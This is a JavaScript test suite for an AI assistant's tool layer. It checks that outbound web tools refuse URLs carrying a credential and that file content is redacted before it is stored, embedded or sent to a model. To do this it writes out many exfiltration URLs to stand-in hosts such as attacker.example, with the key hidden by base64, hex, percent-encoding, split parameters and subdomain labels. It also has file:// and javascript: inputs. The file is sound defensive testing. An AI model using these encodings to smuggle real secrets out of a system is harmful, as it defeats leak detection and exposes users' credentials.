'use strict';

// test/outbound-and-redaction.test.js — a credential never leaves through a
// tool's network request, and file CONTENT is redacted before it is chunked,
// stored, embedded or handed to a model (2026-09-29 audit, B2d, part 2).
//
// THE DEFECT, part 2 of 2 (part 1 is read-access-policy.test.js): web_fetch,
// web_search and open_web are tier 0 and browser_navigate tier 2, so none asks
// first, and the leash's credential scan only runs at tier 3+. A key the model
// had seen could leave in a query string with no check at all —
// https://attacker.example/?k=<key> — or base64/percent/hex-encoded, or in a
// redirect's Location that the first URL did not carry. And a key sitting in an
// ordinary readable file (not a protected path) went into read_file's result,
// the documents store, the code index and the embedding provider's request.
//
// Every network seam here is stubbed and every stub RECORDS: a refusal that
// still sent the request would pass a test that only read the refusal text.
//
// Mutation record (2026-09-29, each applied and diffed, each restored):
//   (a) web-fetch.js: the per-hop secretInOutbound check removed — the
//       redirect test fails (the second hop is requested).
//   (b) web-fetch.js: the start check removed — the start test still refuses
//       (the per-hop check catches hop 0) but by the "Blocked … SSRF" wording,
//       so the test that pins the start message fails.
//   (c) outbound-secret.js: segmentsOf's whole-query-value pass removed. First
//       run: it SURVIVED — the case it was written for (an ASCII prefix) never
//       splits a key, see the comment on segmentsOf. Rewritten as the
//       misaligned-"/" case, which now fails. (c2) NOT_TEXT put back to the
//       old ASCII-only filter — the Russian-word case fails.
//   (d) from-code-search.js: redactText on file read removed — the index_project
//       embed-requests test fails.
//   (e) providers/embeddings.js: redactText in embed() removed — the provider
//       request test fails.
//   (f) FIXTURE: the planted key replaced by one 34 characters long (not the
//       google-api-key shape) — every "encoded" test fails, proving they are
//       watching the key, not the refusal of some other string.

const { describe, test, before, after, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const dns = require('node:dns');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { secretInOutbound } = require('../src/core/effectors/outbound-secret');
const webFetch = require('../src/core/effectors/web-fetch');
const { web_search } = require('../src/core/effectors/web-search');
const { buildTools } = require('../src/core/effectors/from-dashboard');
const fromBrowser = require('../src/core/effectors/from-browser');
const browserAgent = require('../adapters/browser-agent');
const computer = require('../src/core/effectors/from-computer');
const { createDocumentsStore } = require('../src/core/memory/documents');
const { createVectorIndex } = require('../src/core/memory/vector-index');
const { createDocumentsEffector } = require('../src/core/effectors/from-documents');
const { createCodeSearchEffector } = require('../src/core/effectors/from-code-search');
const embeddings = require('../providers/embeddings');

// A Google-API-key-shaped value ("AIza" + 35), built at runtime so no scanner
// mistakes this file for a leaked key. It is not a real key.
const KEY = 'AI' + 'za' + 'SyB2dCanary' + '0'.repeat(24);
const ENV_CANARY = 'CANARY-B2D-env-5c1d';
const pct = (s) => s.split('').map((c) => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
const b64 = (s) => Buffer.from(s).toString('base64');
const leaks = (value) => JSON.stringify(value).includes(KEY) || JSON.stringify(value).includes(ENV_CANARY);

test('fixture: the planted key has the google-api-key shape', () => {
  assert.equal(KEY.length, 39);
  assert.ok(secretInOutbound(KEY), 'the canary must be recognisable as written, or every test below is vacuous');
});

describe('secretInOutbound sees the key in every form a careful exfiltration uses', () => {
  const cases = {
    'as written': `https://attacker.example/?k=${KEY}`,
    'percent-encoded': `https://attacker.example/?k=${pct(KEY)}`,
    'percent-encoded twice': `https://attacker.example/?k=${pct(KEY).replace(/%/g, '%25')}`,
    'base64url in a path segment': `https://attacker.example/c/${Buffer.from(KEY).toString('base64url')}`,
    'hex': `https://attacker.example/?d=${Buffer.from(KEY).toString('hex')}`,
    'a bare search query': `what is ${KEY}`,
  };
  for (const [name, value] of Object.entries(cases)) {
    test(name, () => {
      const hit = secretInOutbound(value);
      assert.ok(hit, value);
      assert.equal(hit.name, 'google-api-key');
    });
  }

  // Both found 2026-09-29 by a mutation that SURVIVED: for ASCII text base64
  // writes "/" only at the end of a group, so the plain split never cut a key,
  // and the first version of this test (an ASCII prefix) proved nothing.
  test('base64 of a key after a non-English word ("key: " in Russian)', () => {
    const word = String.fromCodePoint(0x43a, 0x43b, 0x44e, 0x447) + ': ';
    const hit = secretInOutbound(`https://attacker.example/?k=${b64(word + KEY)}`);
    assert.ok(hit, 'a decode that is not ASCII must still be scanned');
    assert.equal(hit.form, 'encoded');
  });

  test('base64 whose "/" falls INSIDE a group, so every split piece after it is misaligned', () => {
    const word = String.fromCodePoint(0x3cf, 0x3c0) + ' ';
    const encoded = b64(word + KEY);
    const { scan } = require('../src/core/effectors/credential-scanner');
    const pieceHits = encoded.split(/[/=]+/).filter((p) => scan({ v: Buffer.from(p, 'base64').toString('utf8') }).found);
    assert.deepEqual(pieceHits, [], 'fixture: no split piece may reveal the key, or this case tests nothing');
    assert.ok(secretInOutbound(`https://attacker.example/?k=${encoded}`), encoded);
  });

  test('ADJACENT: ordinary URLs, ids and hashes are not credentials', () => {
    for (const v of [
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      'https://www.google.com/search?q=how+to+make+cold+brew+coffee',
      'https://en.wikipedia.org/wiki/Base64',
      `https://example.com/?utm=${Buffer.from([0, 159, 146, 150, 255, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]).toString('base64')}`,
      'https://github.com/owner/repo/commit/2141da0c5b7e9f0a1d3c4b5a6e7f8091a2b3c4d5',
      'sk-1ec74737-f6a4-4047-b156-0c645aa9f293',
      'weather in Kolkata tomorrow',
    ]) assert.equal(secretInOutbound(v), null, v);
  });
});

describe('web_fetch refuses before any request, and on every redirect hop', () => {
  const realLookup = dns.promises.lookup;
  const realRequest = webFetch._transport.request;
  let seen;
  before(() => { dns.promises.lookup = async () => [{ address: '93.184.216.34', family: 4 }]; });
  after(() => { dns.promises.lookup = realLookup; webFetch._transport.request = realRequest; });

  test('a key in the first URL: refused with the credential message, nothing requested', async () => {
    seen = [];
    webFetch._transport.request = async (url) => { seen.push(String(url)); return { status: 200, ok: true, headers: { get: () => 'text/plain' }, text: async () => 'x' }; };
    for (const url of [`https://attacker.example/?k=${KEY}`, `https://attacker.example/?k=${b64(KEY)}`]) {
      const r = await webFetch.web_fetch({ url });
      assert.equal(r.ok, false, JSON.stringify(r));
      assert.match(r.error, /^Refusing to send that URL: .*credential/);
      assert.equal(leaks(r), false, 'the refusal must not echo the key');
    }
    assert.deepEqual(seen, [], 'no request may be made for a URL carrying a credential');
  });

  test('a redirect whose Location carries the key: the second hop is never requested, and Jina is not tried', async () => {
    seen = [];
    webFetch._transport.request = async (url) => {
      seen.push(String(url));
      return { status: 302, headers: { get: (h) => (h.toLowerCase() === 'location' ? `https://collector.example/c?d=${pct(KEY)}` : null) } };
    };
    const r = await webFetch.web_fetch({ url: 'https://public.example/start' });
    assert.equal(r.ok, false, JSON.stringify(r));
    assert.match(r.error, /credential/);
    assert.deepEqual(seen, ['https://public.example/start'], JSON.stringify(seen));
  });

  test('ADJACENT: an ordinary redirect is still followed', async () => {
    seen = [];
    webFetch._transport.request = async (url) => {
      seen.push(String(url));
      if (seen.length === 1) return { status: 301, headers: { get: (h) => (h.toLowerCase() === 'location' ? 'https://public.example/final' : null) } };
      return { status: 200, ok: true, headers: { get: () => 'text/plain' }, text: async () => 'final page' };
    };
    const r = await webFetch.web_fetch({ url: 'https://public.example/start' });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(r.result.content, 'final page');
  });
});

describe('web_search, open_web and browser_navigate refuse a credential without touching the network', () => {
  const realFetch = global.fetch;
  const realStatus = browserAgent.getStatus;
  const realEnsure = browserAgent.ensureOnline;
  let fetched;
  before(() => {
    // A browser must never launch from this file: if a gate below regressed,
    // requireOnline() would otherwise start a real debug browser.
    browserAgent.getStatus = () => ({ state: 'OFFLINE' });
    browserAgent.ensureOnline = async () => { throw new Error('stubbed: no browser in tests'); };
  });
  after(() => { browserAgent.getStatus = realStatus; browserAgent.ensureOnline = realEnsure; });
  afterEach(() => { global.fetch = realFetch; });
  const recordFetch = () => { fetched = []; global.fetch = async (u) => { fetched.push(String(u)); throw new Error('stubbed network'); }; };

  test('web_search', async () => {
    recordFetch();
    const r = await web_search({ query: `find the owner of ${KEY}` });
    assert.equal(r.ok, false, JSON.stringify(r));
    assert.match(String(r.result), /credential/);
    assert.equal(leaks(r), false);
    assert.deepEqual(fetched, []);
  });

  test('open_web: in the query, the url and the location', async () => {
    recordFetch();
    const openWeb = buildTools({ goalsEffector: {}, pipeline: {}, kanban: {}, agentActions: {}, buildRunner: {}, config: {}, fs: null,
      bus: { emit() {} }, probes: { getStatus: async () => ({}) } }).TOOLS.find((t) => t.name === 'open_web').fn;
    for (const args of [{ type: 'search', query: KEY }, { type: 'web', url: `https://x.example/?k=${Buffer.from(KEY).toString('hex')}` },
      { type: 'weather', location: pct(KEY) }, { type: 'web', url: `https://x.example/?k=${KEY}`, browser: true }]) {
      const r = await openWeb(args);
      assert.equal(r.ok, false, JSON.stringify(args) + ' -> ' + JSON.stringify(r));
      assert.match(JSON.stringify(r), /credential/);
      assert.equal(leaks(r), false);
    }
    assert.deepEqual(fetched, []);
  });

  test('browser_navigate: http(s) only, and no credential', async () => {
    for (const url of ['file:///C:/Windows/win.ini', 'javascript:alert(1)', 'data:text/html,<b>x</b>']) {
      const r = await fromBrowser.browser_navigate({ url });
      assert.equal(r.ok, false, url);
      assert.match(String(r.result), /http:\/\/ and https:\/\/ pages only/, url);
    }
    const r = await fromBrowser.browser_navigate({ url: `https://x.example/?k=${b64(KEY)}` });
    assert.equal(r.ok, false);
    assert.match(String(r.result), /credential/);
  });

  test('ADJACENT: an ordinary https URL passes both gates (and reaches the offline refusal)', async () => {
    const r = await fromBrowser.browser_navigate({ url: 'https://example.com/' });
    assert.doesNotMatch(JSON.stringify(r), /credential|pages only/);
  });
});

// ---- redaction of CONTENT -----------------------------------------------------

function memFs() {
  const files = new Map();
  return {
    readJSON: (p, fb) => (files.has(p) ? JSON.parse(files.get(p)) : fb),
    readJSONStrict: (p, fb) => (files.has(p) ? JSON.parse(files.get(p)) : fb),
    writeJSON: (p, d) => { files.set(p, JSON.stringify(d)); },
    ensureDir: () => {},
    vaultPath: (...segments) => segments.join('/'),
  };
}
const oneAxis = async () => ({ provider: 'fake', dim: 1, vec: Float32Array.from([1]) });

describe('file content is redacted before it is stored, embedded or answered from', () => {
  let root;
  let savedDirs;
  const SECRETY = `ordinary line\nGEMINI_API_KEY=${ENV_CANARY}\nconst g = "${KEY}";\n`;
  before(() => {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'mythos-b2d-redact-'));
    savedDirs = process.env.VOICE_ALLOWED_DIRS;
    process.env.VOICE_ALLOWED_DIRS = root;
    fs.writeFileSync(path.join(root, 'setup-notes.txt'), SECRETY);
    fs.mkdirSync(path.join(root, 'proj'));
    fs.writeFileSync(path.join(root, 'proj', 'client.js'), SECRETY);
    fs.writeFileSync(path.join(root, 'proj', 'keys.json'), `{"k":"${ENV_CANARY}"}`);
    fs.writeFileSync(path.join(root, 'plain.txt'), 'I like coffee. const token = getToken();\n');
  });
  after(() => {
    if (savedDirs === undefined) delete process.env.VOICE_ALLOWED_DIRS; else process.env.VOICE_ALLOWED_DIRS = savedDirs;
    fs.rmSync(root, { recursive: true, force: true });
  });

  test('read_file returns the file with the secrets replaced, the rest intact', async () => {
    const r = await computer.read_file({ path: path.join(root, 'setup-notes.txt') });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(leaks(r), false, JSON.stringify(r));
    assert.match(JSON.stringify(r), /ordinary line/);
    assert.match(JSON.stringify(r), /\[REDACTED/);
  });

  test('document_ingest: neither the stored chunks nor the embedding requests carry it', async () => {
    const sent = [];
    const store = memFs();
    const documents = createDocumentsStore({ fs: store });
    const documentsIndex = createVectorIndex({ fs: store, store: 'documents' });
    documentsIndex.init();
    const eff = createDocumentsEffector({ documents, documentsIndex, embed: async (t) => { sent.push(t); return oneAxis(); } });
    const r = await eff.document_ingest({ path: path.join(root, 'setup-notes.txt') });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.ok(sent.length > 0);
    assert.equal(leaks(sent), false, 'embedding request carried the secret');
    const found = await eff.document_search({ query: 'notes' });
    assert.ok(found.result.results.length > 0);
    assert.equal(leaks(found), false);
    for (const hit of found.result.results) assert.equal(leaks(documents.get(hit.ref)), false, 'the stored chunk carried the secret');
  });

  test('a chunk stored BEFORE this change is redacted on the way out — search results and the model prompt', async () => {
    const store = memFs();
    const documents = createDocumentsStore({ fs: store });
    const documentsIndex = createVectorIndex({ fs: store, store: 'documents' });
    documentsIndex.init();
    const { ref } = documents.write(SECRETY, { docId: 'legacy', sourceType: 'upload', title: 'old.txt', chunkIndex: 0 });
    documentsIndex.add(ref, await oneAxis());
    const prompts = [];
    const brain = { think: async (req) => { prompts.push(req.messages); return { content: 'answer [1]' }; } };
    const eff = createDocumentsEffector({ documents, documentsIndex, embed: oneAxis, brain });
    const found = await eff.document_search({ query: 'anything' });
    assert.equal(found.result.results.length, 1);
    assert.equal(leaks(found), false);
    await eff.document_answer({ query: 'anything' });
    assert.equal(prompts.length, 1, 'document_answer must have asked the model');
    assert.equal(leaks(prompts), false, 'the model prompt carried the secret');
  });

  test('index_project: no secret in any embedding request, and keys.json is not indexed at all', async () => {
    const sent = [];
    const store = memFs();
    const documents = createDocumentsStore({ fs: store });
    const documentsIndex = createVectorIndex({ fs: store, store: 'documents' });
    documentsIndex.init();
    const eff = createCodeSearchEffector({ documents, documentsIndex, embed: async (t) => { sent.push(t); return oneAxis(); } });
    const r = await eff.index_project({ dir: path.join(root, 'proj') });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.ok(sent.length > 0);
    assert.equal(leaks(sent), false);
    const found = await eff.search_code({ query: 'g' });
    assert.equal(leaks(found), false);
    assert.equal(JSON.stringify(found).includes('keys.json'), false, 'keys.json must never be indexed');
  });

  test('index_project leaves out the MYTHOS config.json when the settings folder is the one indexed (a batch boot)', async () => {
    // settingsDir is the vault's parent. Point the vault inside proj/, so proj/ IS the settings folder.
    computer.registerFromComputer({ register() {} }, { config: { MYTHOS_VAULT_ROOT: path.join(root, 'proj', 'vault') } });
    fs.writeFileSync(path.join(root, 'proj', 'config.json'), JSON.stringify({ NOTE: ENV_CANARY }));
    const files = [];
    const store = memFs();
    const documents = createDocumentsStore({ fs: store });
    const documentsIndex = createVectorIndex({ fs: store, store: 'documents' });
    documentsIndex.init();
    const eff = createCodeSearchEffector({ documents, documentsIndex, embed: async (t) => { files.push(t); return oneAxis(); } });
    assert.equal((await eff.index_project({ dir: path.join(root, 'proj') })).ok, true);
    assert.equal(files.some((t) => t.includes(ENV_CANARY)), false, 'config.json was indexed');
  });

  test('providers/embeddings.embed redacts before the provider request, whoever the caller', async () => {
    const realFetch = global.fetch;
    const cool = embeddings._internal.cooldownUntil;
    const savedCool = { ...cool };
    const bodies = [];
    for (const k of Object.keys(cool)) cool[k] = 0;
    global.fetch = async (u, init) => {
      bodies.push(String((init && init.body) || ''));
      return { ok: true, json: async () => ({ embedding: [0.1, 0.2], data: [{ embedding: [0.1, 0.2] }] }) };
    };
    try {
      await embeddings.embed(SECRETY);
    } finally {
      global.fetch = realFetch;
      Object.assign(cool, savedCool);
    }
    assert.ok(bodies.length > 0, 'no provider was called, so this test proved nothing');
    assert.equal(leaks(bodies), false, bodies[0]);
    assert.match(bodies[0], /ordinary line/);
  });

  test('ADJACENT: an ordinary document is stored byte for byte — lower-case code is not a secret', async () => {
    const store = memFs();
    const documents = createDocumentsStore({ fs: store });
    const documentsIndex = createVectorIndex({ fs: store, store: 'documents' });
    documentsIndex.init();
    const eff = createDocumentsEffector({ documents, documentsIndex, embed: oneAxis });
    await eff.document_ingest({ path: path.join(root, 'plain.txt') });
    const found = await eff.document_search({ query: 'coffee' });
    assert.equal(documents.get(found.result.results[0].ref).text.trim(), 'I like coffee. const token = getToken();');
  });
});

// ---- the independent review's findings (Opus, 2026-09-29) --------------------
// Every "encoded" case below went THROUGH the first decoder (measured the same
// day before the rewrite), and every ADJACENT address below was REFUSED by the
// first scanner, whose openai-key pattern had no left boundary.
// Probes, 2026-09-29, each applied and restored, each red here: percent-decoding
// back to decodeURIComponent (the "%ZZ" case fails); runs matched only as whole
// segments (".png"/"~" fail); alignment fixed at 0 (the stray-prefix case fails);
// no re-decode of decoded forms (base64-of-base64 fails); the dot-removal form
// dropped (subdomain labels fail); the query-values join dropped (split fails);
// the openai-key lookbehind removed (every slug fails); CODE_VALUE removed (the
// process.env line fails); the PGP block form removed (the PGP case fails).
describe('review: encodings the first decoder let through', () => {
  const hex = (x) => Buffer.from(x).toString('hex');
  const cases = {
    // In the PATH: a query value is decoded by URLSearchParams on its own, which
    // would catch this even with the per-escape decoder removed (probe P8's first
    // run survived for exactly that reason).
    'one malformed %ZZ anywhere': `https://a.example/%ZZ/${pct(KEY)}`,
    'base64 with .png after it': `https://a.example/${b64(KEY)}.png`,
    'base64 with ~ before it': `https://a.example/~${b64(KEY)}`,
    // In a query value, so no rearranged form happens to realign it (in a path,
    // "//aexample/x" is 12 characters once the dots go — probe P10 survived that).
    'base64 with a stray character before it': `https://a.example/?k=x${b64(KEY)}`,
    'hex written as 0x...': `https://a.example/?d=0x${hex(KEY)}`,
    'hex spread across subdomain labels': `https://${hex(KEY).match(/.{1,30}/g).join('.')}.attacker.example/`,
    'base64 of base64': `https://a.example/?d=${b64(b64(KEY))}`,
    'four rounds of percent-encoding': `https://a.example/?k=${[1, 2, 3].reduce((x) => x.replace(/%/g, '%25'), pct(KEY))}`,
    'the key split across two parameters': `https://a.example/?a=${KEY.slice(0, 20)}&b=${KEY.slice(20)}`,
  };
  for (const [name, value] of Object.entries(cases)) {
    test(name, () => assert.ok(secretInOutbound(value), value));
  }

  test('ADJACENT: article slugs and ordinary sites are not keys (the first scanner refused all of these)', () => {
    for (const v of ['https://example.com/blog/risk-management-framework-guide', 'task-management-software-for-small-teams',
      'https://github.com/acme/desk-organizer-project-v2', 'https://en.wikipedia.org/wiki/Risk-management_framework',
      'https://sk-telecom.co.kr/en/about-us/company-history', 'https://www.google.com/search?q=' + 'longquery'.repeat(200)]) {
      assert.equal(secretInOutbound(v), null, v);
    }
  });

  test('ADJACENT: a real OpenAI-shaped key after = or a quote is still caught', () => {
    const k = 'sk-' + 'proj-' + 'Bb9Xy7Zq'.repeat(5);
    assert.ok(secretInOutbound('https://a.example/?k=' + k));
    assert.ok(secretInOutbound('"' + k + '"'));
  });
});

describe('review: redaction that changed ordinary code, and token shapes it could not see', () => {
  const { redactCounted, scan } = require('../src/core/effectors/credential-scanner');
  test('a code reference and a database key name are left alone; a literal secret is still redacted', () => {
    for (const line of ['const API_KEY = process.env.GEMINI_API_KEY', 'PRIMARY_KEY: user_id_column', 'SORT_KEY=created_at_desc',
      'TOKEN = getToken(user)', 'the task-management guide']) {
      assert.deepEqual(redactCounted(line), { text: line, count: 0 }, line);
    }
    assert.deepEqual(redactCounted('DB_PASSWORD=hunter2hunter'), { text: 'DB_PASSWORD=[REDACTED]', count: 1 });
  });

  test('GitLab, Hugging Face, npm and GitHub CLI tokens, and a PGP private key block', () => {
    for (const [name, v] of [['gitlab-token', 'glpat-' + 'Ab3dEf6hIj9kLm2nOp5q'], ['huggingface-token', 'hf_' + 'Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4z'],
      ['npm-token', 'npm_' + 'Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4zAb3d'], ['github-token', 'gho_' + 'Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4zAb3d']]) {
      assert.ok(scan({ v }).matches.some((m) => m.name === name), name);
    }
    const block = '-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQOYBF' + 'x'.repeat(40) + '\n-----END PGP PRIVATE KEY BLOCK-----';
    assert.equal(redactCounted('before\n' + block + '\nafter').text, 'before\n[REDACTED:private-key]\nafter');
  });
});
